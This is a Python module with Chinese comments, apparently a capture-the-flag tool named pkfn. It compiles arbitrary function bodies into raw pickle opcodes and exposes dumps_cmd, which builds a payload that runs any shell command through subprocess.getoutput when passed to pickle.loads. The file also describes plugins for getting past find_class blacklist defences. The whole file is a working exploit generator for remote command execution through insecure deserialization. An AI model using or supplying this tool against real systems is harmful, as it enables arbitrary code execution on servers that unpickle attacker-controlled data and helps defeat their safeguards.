"""pkfn — 把命令编译成 pickle 反序列化 payload 的框架。

对外只暴露一个函数:

    dumps_cmd(command, plugins=()) -> bytes

生成可直接交给 pickle.loads 的 payload, 在目标机上执行 command。

pkfn 本体不做任何绕过技巧, 只维持两件事:
  1. 编译框架: 函数体 AST -> pickle opcode (_Compiler / dumps / dis)
  2. 插件插拔: 插件通过 preamble() 提供前置源码行(绑定函数体用到的名字),
     通过 COMPILER 提供编译器子类(改变全局引用的发码方式)

dumps_cmd 生成的函数体按约定使用两个名字, 由插件 preamble 绑定:
    import_module   传模块名字符串, 返回模块对象
    getattr         同 builtins.getattr
不传插件时使用内置朴素插件(直接 importlib 直通, find_class 会看到
importlib.import_module / builtins.getattr); 需要绕过 find_class
黑名单时, 传入 plugins/find_class_blacklist_bypass.py 这类插件。

示例:
    from pkfn import dumps_cmd
    payload = dumps_cmd('cat /flag')                    # 朴素直通
    payload = dumps_cmd('cat /flag', plugins=[bypass])  # 插件

dumps(fn, plugins) 仍是底层接口: 把任意无参函数体编译成 pickle,
供插件作者 / 高级用法使用。
"""

import ast
import builtins
import importlib
import inspect
import textwrap

__all__ = ['dumps_cmd']


def _escape_str(s):
    try:
        s.encode('ascii')
    except UnicodeEncodeError:
        raise ValueError('non-ASCII string not supported: %r' % s)
    s = (s.replace('\\', '\\\\')
          .replace("'", "\\'")
          .replace('\n', '\\n')
          .replace('\r', '\\r'))
    return "S'%s'\n" % s


def _cons_const(v):
    if v is None:
        return 'N'
    if v is True:
        return 'I01\n'
    if v is False:
        return 'I00\n'
    if isinstance(v, int):
        return 'I%d\n' % v
    if isinstance(v, float):
        return 'F%s\n' % v
    raise TypeError('unsupported constant: %r' % (v,))


class _Compiler:
    """把函数体 AST 翻译成 pickle opcode。

    名字解析规则:
      - 函数内赋值过的名字            -> memo 里的运行时对象 (g opcode)
      - import 进来的名字             -> 按模块路径解析
      - 其余名字 / 属性链             -> 编译期尝试 import 解析,
        能解析成 "模块.属性" 的就发全局 opcode (走目标的 find_class),
        解析不了属性根的再看 builtins
      - 运行时对象上的 .attr / [key]  -> operator.attrgetter / itemgetter 调用

    verify=True 时编译期校验模块属性链存在, 尽早暴露拼写错误。

    子类可覆盖 push_string / _emit_global_ref 改变全局引用的发码方式
    (如 protocol 4 的 STACK_GLOBAL), 见 plugins/find_class_blacklist_bypass.py。
    """

    def __init__(self, verify=True):
        self.verify = verify
        self.locals = {}       # name -> memo index
        self.global_refs = {}  # name -> dotted path, 由 import 语句登记
        self.memo_index = 0
        self.out = []          # list[bytes]
        self.terminated = False

    # ---------- 基础发射 ----------

    def push(self, s):
        if isinstance(s, str):
            s = s.encode('utf-8')
        self.out.append(s)

    def push_string(self, s):
        self.push(_escape_str(s))

    def put(self):
        """栈顶对象存入 memo 并弹栈, 返回 memo 下标。"""
        idx = self.memo_index
        self.push('p%d\n0' % idx)
        self.memo_index += 1
        return idx

    # ---------- 语句 ----------

    def compile_body(self, stmts):
        for stmt in stmts:
            self.visit_stmt(stmt)
            if self.terminated:
                break

    def visit_stmt(self, node):
        if isinstance(node, ast.Assign):
            self.visit_assign(node)
        elif isinstance(node, ast.Expr):
            self.emit_expr(node.value)
            self.push('0')          # 丢弃表达式结果
        elif isinstance(node, ast.Return):
            if node.value is None:
                self.push('N')
            else:
                self.emit_expr(node.value)
            self.push('.')
            self.terminated = True
        elif isinstance(node, ast.Import):
            for alias in node.names:
                if alias.asname:
                    self.global_refs[alias.asname] = alias.name
                else:
                    # import a.b 绑定的是顶层包 a
                    top = alias.name.split('.')[0]
                    self.global_refs[top] = top
        elif isinstance(node, ast.ImportFrom):
            if node.level or node.module is None:
                raise SyntaxError(
                    'relative import not supported at line %s'
                    % getattr(node, 'lineno', '?'))
            for alias in node.names:
                if alias.name == '*':
                    raise SyntaxError(
                        'star import not supported at line %s'
                        % getattr(node, 'lineno', '?'))
                bind = alias.asname or alias.name
                self.global_refs[bind] = '%s.%s' % (node.module, alias.name)
        elif isinstance(node, ast.Pass):
            pass
        else:
            raise SyntaxError(
                'unsupported statement at line %s: %s'
                % (getattr(node, 'lineno', '?'), type(node).__name__))

    def visit_assign(self, node):
        if len(node.targets) != 1:
            raise SyntaxError(
                'multi-target assignment not supported at line %s'
                % getattr(node, 'lineno', '?'))
        target = node.targets[0]
        if isinstance(target, ast.Name):
            self.emit_expr(node.value)
            self.locals[target.id] = self.put()
        elif isinstance(target, ast.Subscript):
            # d[k] = v  ->  s opcode
            if not (isinstance(target.value, ast.Name)
                    and target.value.id in self.locals):
                raise SyntaxError('subscript assign target must be a local variable')
            self.push('g%d\n' % self.locals[target.value.id])
            self.emit_expr(target.slice)
            self.emit_expr(node.value)
            self.push('s')
        elif isinstance(target, ast.Attribute):
            # o.a = v  ->  dict state + b opcode (BUILD) + 0 (POP 掉实例,
            # BUILD 只窥视不弹栈, 不 POP 会在栈上留渣)
            if not (isinstance(target.value, ast.Name)
                    and target.value.id in self.locals):
                raise SyntaxError('attribute assign target must be a local variable')
            self.push('g%d\n' % self.locals[target.value.id])
            self.push('(')
            self.push_string(target.attr)
            self.emit_expr(node.value)
            self.push('db0')
        else:
            raise SyntaxError('unsupported assignment target: %s'
                              % type(target).__name__)

    # ---------- 表达式 ----------

    def emit_expr(self, node):
        if isinstance(node, ast.Constant):
            if isinstance(node.value, str):
                self.push_string(node.value)
            else:
                self.push(_cons_const(node.value))
        elif isinstance(node, ast.UnaryOp) and isinstance(node.op, ast.USub) \
                and isinstance(node.operand, ast.Constant):
            v = node.operand.value
            if isinstance(v, (int, float)):
                self.push(_cons_const(-v))
            else:
                raise TypeError('unsupported negative constant: %r' % (v,))
        elif isinstance(node, (ast.List, ast.Tuple)):
            self.push('(')
            for elt in node.elts:
                self.emit_expr(elt)
            self.push('l' if isinstance(node, ast.List) else 't')
        elif isinstance(node, ast.Dict):
            self.push('(')
            for k, v in zip(node.keys, node.values):
                self.emit_expr(k)
                self.emit_expr(v)
            self.push('d')
        elif isinstance(node, ast.Name):
            self.emit_name(node.id)
        elif isinstance(node, ast.Attribute):
            self.emit_attribute(node)
        elif isinstance(node, ast.Subscript):
            self.emit_subscript(node)
        elif isinstance(node, ast.Call):
            if node.keywords:
                raise SyntaxError(
                    'keyword arguments not supported at line %s'
                    % getattr(node, 'lineno', '?'))
            self.emit_call(node.func, node.args)
        else:
            raise SyntaxError(
                'unsupported expression at line %s: %s'
                % (getattr(node, 'lineno', '?'), type(node).__name__))

    def emit_name(self, name):
        if name in self.locals:
            self.push('g%d\n' % self.locals[name])
        elif name in self.global_refs:
            self.emit_global_chain(self.global_refs[name].split('.'))
        else:
            self.emit_global_chain([name])

    def _emit_attr_of_top(self, attr):
        """栈顶对象取属性: attrgetter 调用 (需要 memo 倒手)。"""
        idx = self.put()
        self.push('coperator\nattrgetter\n(')
        self.push_string(attr)
        self.push('tR(g%d\ntR' % idx)

    def _emit_runtime_attrs(self, attrs):
        for attr in attrs:
            self._emit_attr_of_top(attr)

    def emit_attribute(self, node):
        parts = []
        base = node
        while isinstance(base, ast.Attribute):
            parts.append(base.attr)
            base = base.value
        if not isinstance(base, ast.Name):
            # 链式调用的结果上再取属性, 如 f().x / a.b().c.d
            self.emit_expr(base)
            self._emit_runtime_attrs(parts[::-1])
            return
        parts.append(base.id)
        parts.reverse()                     # ['a', 'b', 'c'] for a.b.c
        root = parts[0]

        if root in self.locals:
            # 运行时对象上的属性: attrgetter 链
            self.push('g%d\n' % self.locals[root])
            self._emit_runtime_attrs(parts[1:])
        else:
            path = self.global_refs.get(root)
            full = (path.split('.') if path else [root]) + parts[1:]
            self.emit_global_chain(full)

    def emit_subscript(self, node):
        # x[k] -> itemgetter(k)(x)
        self.emit_expr(node.value)
        idx = self.put()
        self.push('coperator\nitemgetter\n(')
        self.emit_expr(node.slice)
        self.push('tR(g%d\ntR' % idx)

    def emit_call(self, func, args):
        if isinstance(func, ast.Attribute) and self._is_runtime_attr(func):
            # obj.method(...) -> attrgetter('method')(obj)(...)
            self.push('coperator\nattrgetter\n(')
            self.push_string(func.attr)
            self.push('tR(')
            self.emit_expr(func.value)
            self.push('tR')
        else:
            self.emit_expr(func)
        self.push('(')
        for a in args:
            self.emit_expr(a)
        self.push('tR')

    def _is_runtime_attr(self, node):
        """属性根是函数内变量、或根本不是一个名字 (如 f().x 链式调用)
        时为 True (需要 attrgetter); 能编译期解析成模块路径时为 False
        (走全局 opcode)。"""
        base = node
        while isinstance(base, ast.Attribute):
            base = base.value
        if isinstance(base, ast.Name):
            return base.id in self.locals
        return True

    def emit_global_chain(self, parts):
        """把 ['os','path','join'] 这类点分路径翻译成全局 opcode。"""
        mod_name, rest = self._resolve_global(parts)
        if not rest:
            # 整个名字就是个模块: import_module('a.b') 调用
            self.push('cimportlib\nimport_module\n(')
            self.push_string(mod_name)
            self.push('tR')
            return
        self._emit_global_ref(mod_name, rest)

    def _resolve_global(self, parts):
        """优先按最长模块前缀解析, 其次 builtins, 都不行报 NameError。
        返回 (mod_name, rest): 模块名 + 剩余的属性链。"""
        for i in range(len(parts), 0, -1):
            mod_name = '.'.join(parts[:i])
            try:
                mod = importlib.import_module(mod_name)
            except Exception:
                continue
            rest = parts[i:]
            if self.verify:
                obj = mod
                for a in rest:
                    if not hasattr(obj, a):
                        raise NameError(
                            'module %r has no attribute %r' % (mod_name, a))
                    obj = getattr(obj, a)
            return mod_name, rest
        if hasattr(builtins, parts[0]):
            return 'builtins', list(parts)
        if not self.verify:
            # 编译期不可解析 (如目标机独有的模块): 首段当模块名,
            # 其余按属性链发码, 留给 load 期求值
            return parts[0], list(parts[1:])
        raise NameError('cannot resolve name %r' % parts[0])

    def _emit_global_ref(self, mod_name, rest):
        """发全局引用 opcode: 文本 c opcode + attrgetter 链。
        子类可覆盖此方法改发 STACK_GLOBAL。"""
        self.push('c%s\n%s\n' % (mod_name, rest[0]))
        self._emit_runtime_attrs(rest[1:])


# ---------- 插件机制 ----------

def _compile(body, plugins):
    """body: 函数体语句列表 (ast 节点)。plugins 的 preamble 行拼在最前,
    并可用 COMPILER 替换编译器。返回 pickle 字节流。"""
    compiler_cls = _Compiler
    for plugin in plugins:
        preamble = plugin.preamble if callable(getattr(plugin, 'preamble', None)) \
            else (lambda: plugin.PREAMBLE)
        stmts = []
        for line in preamble():
            stmts.extend(ast.parse(textwrap.dedent(line)).body)
        body = stmts + body
        cls = getattr(plugin, 'COMPILER', None)
        if cls is not None:
            compiler_cls = cls

    compiler = compiler_cls()
    compiler.compile_body(body)
    if not compiler.terminated:
        compiler.push('N.')
    return b''.join(compiler.out)


def dumps(fn, plugins=()):
    """把一个无参数函数编译成 pickle 字节流 (底层接口)。

    fn 永远不会被执行, 只读取它的源码并编译。函数体写普通 Python:
      - 赋值 / 下标赋值 d[k]=v / 属性赋值 o.a=v
      - 函数调用、方法调用、属性访问、下标访问
      - 常量、list / tuple / dict 字面量
      - import / from ... import ...
      - return X (缺省时自动返回 None)
      不支持 (显式 SyntaxError): 关键字参数、多目标赋值、import *、
      相对导入、运算符/条件/循环等其余语句与表达式。

    plugins: 可选的插件列表。插件可以提供两种钩子:
      - preamble(): 返回若干行 Python 源码, 会被拼在函数体之前一起编译,
        插件绑定的变量名在函数体内可直接使用
      - COMPILER: 一个 _Compiler 子类, 替换默认编译器
        (改变全局引用的发码方式 / 编译期校验行为)
      见 plugins/ 目录。
    """
    src = textwrap.dedent(inspect.getsource(fn))
    tree = ast.parse(src)
    fn_node = None
    for node in ast.walk(tree):
        if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
            fn_node = node
            break
    if fn_node is None:
        raise TypeError('dumps() expects a function, got %r' % (fn,))
    return _compile(list(fn_node.body), plugins)


def dis(fn, **kw):
    """调试用: 打印 dumps(fn, **kw) 的反汇编。"""
    import pickletools
    pickletools.dis(dumps(fn, **kw))


# ---------- 对外接口 ----------

class _PlainPlugin(object):
    """朴素默认插件: 直接 importlib 直通, 不做任何绕过。"""

    @staticmethod
    def preamble():
        return ['import importlib',
                'import_module = importlib.import_module']


def _cmd_body(command):
    """dumps_cmd 的标准执行体。

    按插件契约使用两个名字 (由插件 preamble 绑定):
        import_module   传模块名字符串, 返回模块对象
        getattr         同 builtins.getattr
    用 subprocess.getoutput(CMD) 执行命令 (自带 shell, stderr 并入 stdout),
    返回文本输出 (str)。
    """
    return [
        "sub_mod = import_module('subprocess')",
        "getoutput = getattr(sub_mod, 'getoutput')",
        'return getoutput(%r)' % command,
    ]


def dumps_cmd(command, plugins=()):
    """生成执行 command 的 pickle payload (bytes), 可直接交给 pickle.loads。

    执行语义: subprocess.getoutput(command) — 自带 shell, stderr 并入 stdout,
    load 的返回值是命令的文本输出 (str)。

    command: 目标机上要执行的命令字符串。
    plugins: 可选插件列表, 为空时使用内置朴素插件 (直接 importlib 直通,
             find_class 会看到 importlib.import_module / builtins.getattr)。
             黑名单场景请传绕过插件, 见 plugins/find_class_blacklist_bypass.py。
    """
    plugins = tuple(plugins) or (_PlainPlugin(),)
    src = 'def exp():\n' + ''.join('    %s\n' % line for line in _cmd_body(command))
    fn_node = ast.parse(src).body[0]
    return _compile(list(fn_node.body), plugins)
